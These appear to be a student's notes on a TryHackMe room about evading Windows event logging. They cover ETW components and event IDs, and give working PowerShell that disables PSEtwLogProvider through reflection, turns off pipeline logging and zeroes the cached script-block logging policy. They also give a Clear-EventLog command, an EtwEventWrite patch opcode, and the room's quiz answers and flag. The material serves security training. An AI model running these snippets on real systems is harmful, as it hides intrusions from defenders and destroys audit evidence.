# Evading Logging and Monitoring - Medium

1. [Event Tracing](#event-tracing)
2. [Approaches to Log Evasion](#approaches-to-log-evasion)
3. [Tracing Instrumentation](#tracing-instrumentation)
4. [Reflection for Fun and Silence](#reflection-for-fun-and-silence)
5. [Patching Tracing Functions](#patching-tracing-functions)
6. [Providers via Policy](#providers-via-policy)
7. [Group Policy Takeover](#group-policy-takeover)
8. [Abusing Log Pipeline](#abusing-log-pipeline)
9. [Real World Scenario](#real-world-scenario)

## Event Tracing

* Primary target for attacker is the event logs, managed and controlled by ETW (Event Tracing for Windows).

* ETW components:

  * Controllers - build & configure sessions

  * Providers - generate events

  * Consumers - interpret events

* Event IDs are a core feature of Windows logging; events are sent & transferred in XML format.

```markdown
1. What ETW component will build and configure sessions? - controllers

2. What event ID logs when a user account was deleted? - 4726
```

## Approaches to Log Evasion

* It is typical for a modern system to employ log forwarding; so deleting logs from host machine would not remove logs, instead it would be tracked by ETW.

* Most published evasion techniques target ETW components since those allow attacker most control over the tracing process.

```markdown
1. How many total events can be used to track event tampering? - 3

2. What event ID logs when the log file was cleared? - 104
```

## Tracing Instrumentation

* In ETW, events originate from providers; controllers will determine where data is sent and how it is processed in sessions; and consumers will save/deliver logs to be interpreted & analyzed.

* Techniques to target components:

  * Provider - PSEtwLogProvider Modification, Group Policy Takeover, Log Pipeline Abuse, Type Creation

  * Controller - Patching EtwEventWrite, Runtime Tracing Tampering

  * Consumers - Log Smashing, Log Tampering

## Reflection for Fun and Silence

* PowerShell reflection:

  * Obtain .NET assembly for PSEtwLogProvider:
  
  ```ps
  $logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
  ```
  
  * Store null value for etwProvider field:
  
  ```ps
  $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
  ```
  
  * Set the field for m_enabled to previously stored value:
  
  ```ps
  [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
  ```

```markdown
1. What reflection assembly is used? - PSEtwLogProvider

2. What field is overwritten to disable ETW? - m_enabled
```

## Patching Tracing Functions

* ETW is written from the function ```EtwEventWrite```; to identify 'patch points' (returns), we can view disassembly of the function.

* ETW patching:

  * Obtain handle for ```EtwEventWrite```
  * Modify memory permissions of function
  * Write opcode bytes to memory
  * Reset memory permissions of function
  * Flush instruction cache

```markdown
1. What is the base address for the ETW security check before it is patched? - 779f245b

2. What is the non-delimited opcode used to patch ETW for x64 architecture? - c21400
```

## Providers via Policy

* ETW disables some features by default due to the amount of logs they can create; these can be enabled by modifying the GPO (Group Policy Object) settings of their parent policy.

```markdown
1. How many total events are enabled through script block and module providers? - 2

2. What event ID will log script block execution? - 4104
```

## Group Policy Takeover

* Group policy takeover:

  * Obtain group policy settings from utility cache
  * Modify generic provider to 0
  * Modify invocation or module definition

```markdown
1. What event IDs can be disabled using this technique? - 4103,4104

2. What provider setting controls 4104 events? - EnableScriptBlockLogging
```

## Abusing Log Pipeline

* Abusing log pipeline:

  * Obtain the target module:
  
  ```ps
  $module = Get-Module Microsoft.PowerShell.Utility
  ```
  
  * Set module execution details to ```$false```:
  
  ```ps
  $module.LogPipelineExecutionDetails = $false
  ```
  
  * Obtain module snap-in:
  
  ```ps
  $snap = Get-PSSnapin Microsoft.PowerShell.Core
  ```
  
  * Set snap-in execution details to ```$false```:
  
  ```ps
  $snap.LogPipelineExecutionDetails = $false
  ```

```markdown
1. What type of logging will this method prevent? - module logging

2. What target module will disable logging for all Microsoft utility modules? - Microsoft.PowerShell.Utility
```

## Real World Scenario

* Script for given scenario:

```ps
#disable GPO settings by running the GPO-bypass script on Desktop

$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static');
  If ($GroupPolicyField) {
      $GroupPolicyCache = $GroupPolicyField.GetValue($null);
      If ($GroupPolicyCache['ScriptBlockLogging']) {
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
      }
      $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new();
      $val.Add('EnableScriptBlockLogging', 0);
      $val.Add('EnableScriptBlockInvocationLogging', 0);
      $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $val
  };
```

```ps
#now we need to remove logs

Get-EventLog -List
#shows log types

Clear-EventLog "Windows PowerShell"

#if you are not getting flag
#you can reverse-engineer agent.exe to get flag
```

```markdown
1. Enter the flag obtained from the desktop after executing the binary. - THM{51l3n7_l1k3_4_5n4k3}
```
